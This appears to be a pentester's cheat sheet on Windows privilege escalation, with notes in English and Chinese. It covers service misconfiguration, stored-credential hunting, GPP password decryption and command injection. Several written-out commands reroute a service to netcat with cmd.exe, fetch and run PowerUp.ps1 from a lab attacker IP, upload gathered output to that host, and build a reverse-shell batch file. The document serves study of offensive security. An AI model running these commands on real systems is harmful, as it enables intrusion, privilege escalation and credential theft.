# Privilege Escalation Windows
[TOC]
###### tags: `Security` `PrivilegeEscalation`

# Reference
* [🌟Windows 提權 | FuzzySecurity - Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
* [Windows explotion suggester & compiled exp](https://github.com/SecWiki/windows-kernel-exploits/tree/master/win-exp-suggester)
* [Windows Privilege Escalation Vectors](https://toshellandback.com/2015/11/24/ms-priv-esc/) ([中文](https://www.freebuf.com/vuls/87463.html))
* [pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [PayloadsAllTheThings ─ Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

# Tools
## Windows services
[Microsoft's Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)
第一次用 Sysinternal 的工具都會跳出 GUI 同意使用者條款，可以加入 `/accepteula` 參數略過這個步驟。

+ ### Service Control

    * #### sc
    sc can query, configure and manage windows services.
    ```
    C:\> sc qc {{Service name: Spooler}}
    C:\> sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
    C:\> sc config upnphost obj= ".\LocalSystem" password= ""
    ```
    * #### Net
    ```
    C:\> net start upnphost
    ```

+ ### Permission
    ![](https://i.imgur.com/zd4Yjur.png)

    * #### Accesschk
    A tool in Sysinternals Suite
    ```
    -u Suppress errors.
    -c Name is a Windows Service
    -v Verbose (includes Windows Vista Integrity Level).
    -w Show only objects that have write access.
    -d Only process directories or top level key.
    -s Recurse.

    C:\> accesschk.exe -ucqv {{Service name: Spooler}}
    C:\> accesschk.exe -ucqv * # see all the permissions

    # "Authenticated Users", "Power Users" etc your user group
    C:\> accesschk.exe -uwcqv "Authenticated Users" *

    # Find all weak folder permissions per drive.
    C:\> accesschk.exe -uwdqs Users c:\
    C:\> accesschk.exe -uwdqs "Authenticated Users" c:\

    # Find all weak file permissions per drive.
    C:\> accesschk.exe -uwqs Users c:\*.*
    C:\> accesschk.exe -uwqs "Authenticated Users" c:\*.*
    ```
    * #### cacls
### PsExec
拿到某個帳號的權限(測試用)
用高權限的 shell 執行
```
.\PsExec64.exe -i -u "nt authority\local service" cmd.exe
```
## [JuicyPotato](https://github.com/ohpe/juicy-potato.git)
`whoami /priv` have `SeImpersonate` and/or `SeAssignPrimaryToken` enable
> Windows Server 2019 is not affected by this vulnerability.
> Other versions of Windows (Server 2008R2, Server 2012, Server 2012 R2, Server 2016) are affected.

# Information Gathering
## Scripts

### PowerSploit/Privesc
[GitHub](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
```
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

PS C:\Windows\system32> IEX(New-Object Net.WebClient).downloadString("http://10.10.14.42/PowerUp.ps1")                   
PS C:\Windows\system32> Invoke-AllChecks                                   
```

### Windows Management Instrumentation Command-Line
```
Invoke-WebRequest -Uri "http://10.10.14.42/wmic_info.bat" -OutFile wmic_info.bat
.\wmic_info.bat
Invoke-WebRequest -uri "http://10.10.14.42/out.html" -Method Put -Infile ".\out.html" -ContentType 'text/plain' 
```

## Manual
### OS
```
C:\Windows\system32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
### users and permissions
```
C:\Windows\system32> hostname
C:\Windows\system32> whoami

C:\Windows\system32> net users
C:\Windows\system32> net user {{username}}

# list of administrators
C:\Windows\system32> net localgroup administrators
```
### network interfaces & routing table & firewall
```
C:\Windows\system32> ipconfig /all
C:\Windows\system32> route print
C:\Windows\system32> arp -A

C:\Windows\system32> netstat -ano

C:\Windows\system32> netsh firewall show state
C:\Windows\system32> netsh firewall show config
```
### scheduled tasks, running processes, started services and installed drivers.
```
C:\Windows\system32> schtasks /query /fo LIST /v # scheduled tasks
C:\Windows\system32> tasklist /SVC               # running processes
C:\Windows\system32> net start                   # started services
C:\Windows\system32> DRIVERQUERY                 # installed drivers
```

### last
```
# The command below will search the file system for file names containing certain keywords.
# You can specify as many keywords as you wish.
C:\Windows\system32> dir /s *pass* == *cred* == *vnc* == *.config*

# Search certain file types for a keyword, this can generate a lot of output.
C:\Windows\system32> findstr /si password *.xml *.ini *.txt

# Similarly the two commands below can be used to grep the registry for keywords, in this case "password".
C:\Windows\system32> reg query HKLM /f password /t REG_SZ /s
C:\Windows\system32> reg query HKCU /f password /t REG_SZ /s
```

# Privilege Escalation
## kernel 漏洞
```
C:\Windows\system32> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
```

* KiTrap0D (KB979682)
* MS11-011 (KB2393802)
* MS10-059 (KB982799)
* MS10-021 (KB979683)
* MS11-080 (KB2592799)

## sysprep / Unattend
```
c:\sysprep.inf
c:\sysprep\sysprep.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```
```
# This is a sample from sysprep.inf with clear-text credentials.

[GuiUnattended]
OEMSkipRegional=1
OemSkipWelcome=1
AdminPassword=s3cr3tp4ssw0rd
TimeZone=20

# This is a sample from sysprep.xml with Base64 "encoded" credentials. Please people Base64 is not
encryption, I take more precautions to protect my coffee. The password here is "SuperSecurePassword".

<LocalAccounts>
    <LocalAccount wcm:action="add">
        <Password>
            <Value>U3VwZXJTZWN1cmVQYXNzd29yZA==</Value>
            <PlainText>false</PlainText>
        </Password>
        <Description>Local Administrator</Description>
        <DisplayName>Administrator</DisplayName>
        <Group>Administrators</Group>
        <Name>Administrator</Name>
    </LocalAccount>
</LocalAccounts>

# Sample from Unattended.xml with the same "secure" Base64 encoding.

<AutoLogon>
    <Password>
        <Value>U3VwZXJTZWN1cmVQYXNzd29yZA==</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>Administrator</Username>
</AutoLogon>
```

## Groups.xml - Group Policy Preference saved passwords
[The AES Key](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be)
```
 4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
 f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
```
```
PS C:\Programdata> cmd.exe /c "dir /s /b | findstr Groups.xml"
C:\Programdata\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml

PS C:\Programdata> Get-Content "C:\Programdata\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
<?xml version="1.0" encoding="UTF-8" ?><Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator" image="2" changed="2019-01-28 23:12:48" uid="{CD450F70-CDB8-4948-B908-F8D038C59B6C}" userContext="0" removePolicy="0" policyApplied="1">
<Properties action="U" newName="" fullName="" description="" cpassword="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Properties></User></Groups>
```
```
python Gpprefdecrypt.py CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!
```
> In addition to Groups.xml several other policy preference files can have the optional "cPassword" attribute set:
> Services\Services.xml: Element-Specific Attributes
> ScheduledTasks\ScheduledTasks.xml: Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
> Printers\Printers.xml: SharedPrinter Element
> Drives\Drives.xml: Element-Specific Attributes
> DataSources\DataSources.xml: Element-Specific Attributes

## AlwaysInstallElevated
`AlwaysInstallElevated` - 允許所有權限的使用者安裝 `*.msi` 成為 `NT AUTHORITY\SYSTEM`
兩個值都要是`1`
```
C:\Windows\system32> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
C:\Windows\system32> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```


## DLL
DLL search order on 32-bit systems:
1. The directory from which the application loaded
2. 32-bit System directory (C:\Windows\System32)
3. 16-bit System directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. The current working directory (CWD) - 如果是 Windows Service 會在 C:\Windows 中
7. Directories in the PATH environment variable (system then user)

```
msfvenom -f DLL
```

## Command Injection
### pingback check
* generate pingback payload
```
$ echo "ping -n 1 10.10.14.5" | iconv -t utf-16le | base64 -w 0
cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA1AAoA#

> powershell -EncodedCommand cABpAG4AZwAgAC0AbgAgADEAIAAxADAALgAxADAALgAxADQALgA1AAoA
```
* ensure pingback
```
$ tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
18:01:08.824794 IP servmon.htb > kali-workplace: ICMP echo request, id 1, seq 1, length 40
18:01:08.824806 IP kali-workplace > servmon.htb: ICMP echo reply, id 1, seq 1, length 40
```
### nc
```
$ mkdir www && cd www
$ cp /usr/share/windows-resources/binaries/nc.exe .
$ python3 -m http.server 7001

> curl 10.10.14.5:7001/nc.exe > nc.exe
> echo C:\Temp\nc.exe 10.10.14.5 7777 -e cmd.exe > reverse.bat
```